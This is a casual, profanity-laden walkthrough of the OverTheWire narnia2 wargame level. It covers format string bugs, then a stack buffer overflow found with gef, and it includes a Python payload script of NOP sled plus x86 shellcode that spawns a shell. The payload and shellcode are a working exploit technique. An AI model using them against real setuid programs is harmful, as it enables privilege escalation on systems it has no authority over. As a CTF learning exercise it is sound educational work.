# narnia2

New level! Not particularly difficult (we still use a lot of concepts learnt in the past levels) but tricky because involved the use of some tools (gdb or gef) and an awful python 3 feature that ruined the whole vibe :(

## Execute the program
This time i run `file /narnia/narnia2` before waisting another hour behind some stupi thing lol and yes, it looks similar to the previous challenge:
```
/narnia/narnia2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=cbf210f5149351ddfcc3a33ac83f5494225a65dd, for GNU/Linux 3.2.0, not stripped
```
Ok, now we run it and... oh wow it wants an argument, this fucking guy! Anyway, when we pass something it simply prints it right back at us (without even a new line after... wow).
```
$ /narnia/narnia2 PIPPOBAUDO
PIPPOBAUDO$ 
```
Ok... I think I might be sniffing something, let's if my intuition is right.

## Let's look at the code
Mh... It could be what I had in mind, but let's procede with some hypothesis! I see mainly two things that may be interesting:
- the `strcpy(buf,argv[1]);`: oh, a classic! We're copying the content of the argument that we pass to the program into a buffer, which is declared to be 128 bytes big. And you're doing it without checking for length?! This fucking guy...
- the `printf("%s", buf);`: ok, here me out... I think this will turn out to be nothing **BUT**... I remember that the only professor at my university that gave us some ctf-like exercises told us about a thing called _Format String attacks_, fancy uh? And since we're doing this also to learn new stuff, why not follow this track first and end up in a totally wrong space but recall and/or learn?! This fucking guy (this time I'm talking about me)...

## Format String attacks
I like to develop in C because it really makes you think about the stuff you're doing, even the most simple stuff... I mean, the stuff they teach you at the first lesson of C programming, like `printf`s!

You and I perfectly know that a printf looks like this
```printf(argv[1])```
and we're very happy about it.

We also know that a printf maybe also looking like this
```printf("%s", argv[1])```
we're amazing programmers, nobody gonna stop us.

Now, I've written the examples simulating a print of the argument just to make the point that the content may come from the outside, as input. You may see that, the first parameter of the printf, changes according to what we want to do. 
Suppose we're printing a string: in the first case, the string is the first parameter, direct. In the second example, we have a format **string** as first parameter (yes, a format **STRING**, wink wink), while our data is in the second parameter. The function will take care of swapping our string in place of the right format specifier.

So... I, being a very bad guy, say: my string is "PIPPOBAUDO %p". I KNOW RIGHT?
These are the scenarios:
- In the second case, with the format specifier, the printf will substitue my string in place of the specifier. Easy breezy, nice!
- In the first case though... the first parameter of the function will become our function that contains format specifiers! And since the function has this signature ```int printf ( const char * format, ... );``` it signifies that it has 1 **OR** more parameters, but it is perfectly legal for it to have some format specifiers not followed by any value we want to include in the string to print!

Finally, to make a point, go ahead and create a program in your pc that has this code
```
#include <stdio.h>
int main() {
  printf("PIPPOBAUDO %p");
  return 0;
}
```
Run it and... congrats! You leaked a value! Ehehehe!

This method used not only to leak values, but also to write them! Yep, thanks to the format specifier `%n`! To really understand this attack, I found [this very good resource](https://hackinglab.cz/en/blog/format-string-vulnerability/) for the topic, have a look at it! Now back to that fucking guy...

## Another buffer overflow lulz
So we know it is not a format string attack :sad: so let's look at the other option, the careless `strcpy()` without even a single check. 

We saw that the buffer is 128 bytes long, so you know what is the first thing to do right? Let's make this thing crash by giving him a 256 byte long parameter, like this:
```/narnia/narnia2 $(python3 -c "print('A'*256)")```
and we did it. Now, we know what we have done ofc, but we can't really see what we have done. Ok the program crashed, it SEGFAULT, but how? **where?**

If only we had a tool that gives us information about the program behavior while we're running it... Well there is, its name is Gef (semicit.)

Well it's gdb, and you can use it ofc, but on the challenge's server there is gef installed, which is gdb on steroids! So let's try running the binary with gef attacked and see what info we can get by doing so.
```
$ gef /narnia/narnia2
```
And then
```
gef> r $(python3 -c "print('A'*256)")
```
Ok it crashes, but gef displays to us its context, right away (gdb doesn't, so I post the screenshot here).
![images/narnia2-gef-ctx.png]
We already see some interesting things (apart from our yellow 'A's): it says that
```[#0] Id 1, Name: "narnia2", stopped 0x41414141 in ?? (), reason: SIGSEGV```
Stopped in yellow 'A's, mh... (0x41 is the hex value of the ascii 'A' value).
Deductive aproach: we have written a ton of memory, more then the one allocated to the original buffer, the program at one point tried to execute the address `0x41414141` and then became really angry at us because, ofc, that address is no good for him. But this means we have control to an address that the program will execute?!

This means that we're writing, somewhere in the stack, a return address that was originally saved to be jumped to when operations with the function were done. Let's try to run this command in gef
```gef> disass main```
(i know right? disass, thisass ehehehe)

We get this!
![images/narnia2-gef-disass.png]
This is the disassembler that is trying to let us see how the `main` function is made, and we see that yes, we have a `ret` statement! Address `0x080491d8` in the picture, last one.
Ok so if we want to really make sure it is the instruction we're looking for, we could try run the program again with some non-malicious input this time, put a breakpoint at that address with `b *0x080491d8` and then use the `info frame` command to have a recap of the stack and the registers of interest. We get this:
![images/narnia2-gem-nominalframe.png]
In the output of the command we see that this `eip` register is mentioned a lot, which in x86 architecture slang is the same for Program Counter (or Instruction Counter, in this case). So basically, by looking also a the useful graph above, we see that the program after the `ret` function will execute the instruction at address `0xf7d9ecb9`, which is called the `saved eip` in the info frame output. Now try again with the malicious payload and see that the saved eip is now filled with our 0x41 :)

## Precision!
It's easy to say "let's put bytes double the size of the array!" and be happy when everything explodes, but to change that address in a precise manner we need to calculate a little better how many bytes are needed, exactly, to overwrite it.

This I think it's guessing and trial and error lol I found out that 136 bytes are correct number, in this case it is pretty close to the buffer size, but that depends on the stack structure. A tip: to discover this, have the last 4 bytes be something different than 'A', like... 'B' lol Not joking, you can see faster where the different bytes end and adjust the lenght accordingly.

This
```
gef> r $(python3 -c 'print("A"*132 + "B"*4)')
```
gives us this
```
[#0] Id 1, Name: "narnia2", stopped 0x42424242 in ?? (), reason: SIGSEGV
```
yay! 42s, our Bs!

Now it's narnia2 allover again, the ret function has to point to an address where there are instruction that can run a shell as narnia3 to make us cat the password file for the next level. But...

## Python 3, you fuck...
Wait, before I go there, let's think about this: what do you say if we make our payload have this composition?
```
<some_garbage>(132bytes) + <an_address>(4bytes)
```
where some_garbage is, in reality, some correct x86 instructions that simply do nothing, like NOPs, and the address, for the moment, can still be the 42s of our 'B's. If this sounds like I just pulled it out of my hat, it has some sense behind it: when will be writing a meaningful address, we will point to a memory location in the binary that we were able to write with our shellcode, and this memory is exactly the buffer we're writing with the `strcpy`. You can know see that our garbage data in reality has to be something meaningful that the program can execute and for now, NOPs will do the job just right. We will think about the shellcode later.

Now I can start to spread hate about python 3 lol

Let's try to do what we said just now, always in gef let's do this:
```gef> f $(python3 -c 'print("\x90"*132 + "B"*4)')```
where `\x90` is the hex representation of the NOP instruction in x86 architecture.
You'll see that something is strange, because the stack is filled with yes, the `0x90` byte, but alternating with the `0xc2` byte.

WHAT THE FUCK?! I looked into this because I was sure I was doing the right thing, and turned out I was! But with python 3 (the only version accessible in the server) there is some weird interpretation of the string that makes that random `0xc2` byte show up. I admit that I'm still trying to understand what it does with my fucking bytes, and tbh I was about to try delve into it, but when I looked at the solution... I just gave up, fuck you, you snake.

First solution: use python 2 (too bad we don't have it).
Second solution: use this abomination of a script
```
import sys

payload = b'\x90' * 98 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + sys.argv[1].encode('latin-1').decode('unicode_escape').encode('latin-1')
sys.stdout.buffer.write(payload)
```
I really hope this is just my problem sucking at python but goddamn...

Let's analyze it:
- we import `sys` because apparently with the function of the package that writes to stdout, we can actually have the string with the right interpretation of the bytes we want to write. Yikes.
- then I said _"ok, I'll have to change the value of the address I want to write in the eip so let's make this an argument to pass to the script"_ and suddenly I was in that `encode().decode()` chain that Idespite with all my heart. But we go on lol

## Fancy stuff
As you see I took some step forward: we said that we needed to write 136 bytes, 4 for the address, 132 for NOPs. Now, as we were saying, NOPs are real instructions that the OS can execute inside our binary, so other valid instructions can be added too, like a shellcode!
It is exactly the one of narnia1, with a length of 34 bytes, meaning that the number of NOPs is of 98.
Now we run it
```
gef> r $(python3 narnia2.py 'BBBB')
```
and we have our address overwritten in the correct way (try `info frame`) and the stack is filled with the content we want!
Btw, if you want to have a better look at the stack, try
```
gef> x/100x $esp+500
```
Why `+500`? Tbh still trying to understand... You can just look up $esp, but stacks grow from the bottom to the top, so you still to go a little bit down. An alternative would be using `gef> vmmap` to see the stack start and end addresses, and subtracting from the end, until finding our malicious bytes.
The notation before the address is to choose how to display values, (this cheatsheet)[https://trebledj.me/posts/gdb-cheatsheet/] is useful if you want.

By looking at the stack more closely with the last command, we can finally decide which is the address we want to target for the eip new value. Since NOPs are harmful commands (in our case lol) we can even decide to choose an address populated with our NOPs instructions, that eventually, with the eip increasing, will lead to our shellcode execution.

With this stack structure
![images/narnia2-gef-stack-view.png]
I choose the `0xffffd544` address, right in the middle of our NOP chain.

## Success over this fucking guy
Now it's time for
```
gef> r $(python3 narnia2.py '\x44\xd5\xff\xff')
```
remember the endianess!

We have a shell! Now, you might me sad because the shell runs as narnia2 user (try the `whoami` command). Don't worry, it is becaue we're using gdb and the debugger does things in the background when new processes are spawned (like the shell in this case).
If you run it without gdb/gef you'll have the new password to add to your database with narnia-controller.sh!
